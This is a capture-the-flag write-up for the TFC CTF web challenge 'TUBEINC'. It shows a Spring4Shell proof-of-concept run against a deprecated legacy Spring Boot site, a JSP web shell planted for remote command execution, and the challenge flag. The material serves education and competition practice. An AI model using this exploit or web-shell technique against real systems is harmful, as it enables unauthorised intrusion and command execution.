# TFC CTF

## WEB

### TUBEINC

**Difficulty:** Hard

**Statement:** Oook! That's a hard one! I just want to buy some tubes, but I think that the main site is disabled... What now?

***

For this challenge, the website has nothing interesting except the information in the footer :

```html
<footer>
  <p>For the complete functionality of the page add the following entries to your DNS configuration and use tube.com:PORT to connect to the platform.<br>
    34.65.33.171 tube.com<br>
    34.65.33.171 legacy.tube.com<br>
    DO NOT USE THIS IN PRODUCTION!</p>
</footer>
```

I add on my local machine in the file `/etc/hosts` the following entries:

```
34.65.33.171	tube.com
34.65.33.171	legacy.tube.com
```

Now, the website with the domain name legacy.tube.com seems interesting :

![image](https://user-images.githubusercontent.com/49941629/182037436-639186e7-a638-4cc0-b40f-2637e6d2af1f.png)

We can see in the HTML source code the following comment:

```html
  <!--
    Important!
    Due to the recent discovery of a major vulnerability of the used framework, this platform is now deprecated (more information at /info).
    It remains available only for backward compatibility reasons.

    DO NOT USE THIS PLATFORM IN PRODUCTION!
  -->
```

So I go to the URL `http://legacy.tube.com:49445/info`:

![image](https://user-images.githubusercontent.com/49941629/182037490-2cca9d0f-939c-4da0-9c58-e87d665dc438.png)

This page tells us that the spring-boot version is compromised.

After some research, we find a git repo to get a webshell (exploit spring4shell) : https://github.com/reznok/Spring4Shell-POC

POC of exploit :

```
python exploit.py --url "http://legacy.tube.com:49445"                                                                                                                                   ──(dim.,juil.31)─┘
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://legacy.tube.com:49445/shell.jsp?cmd=id
```

By going to the given URL, we can perform RCE :

![image](https://user-images.githubusercontent.com/49941629/182037791-df957ea2-84b7-4732-9dd2-3b2e2e07b6ba.png)

A `ls` then a `cat` allows us to get the flag :

![image](https://user-images.githubusercontent.com/49941629/182037881-c4fb19b0-fd86-48f7-a8e0-2e6411a434ff.png)
![image](https://user-images.githubusercontent.com/49941629/182037904-554c31d7-111b-44dd-ad48-eb796c0b0589.png)

Flag : `TFCCTF{F*_$pr1nG!_I_m_m0R3_0f_4_w1nt3r_p3r$0n_aNyw4y!}`
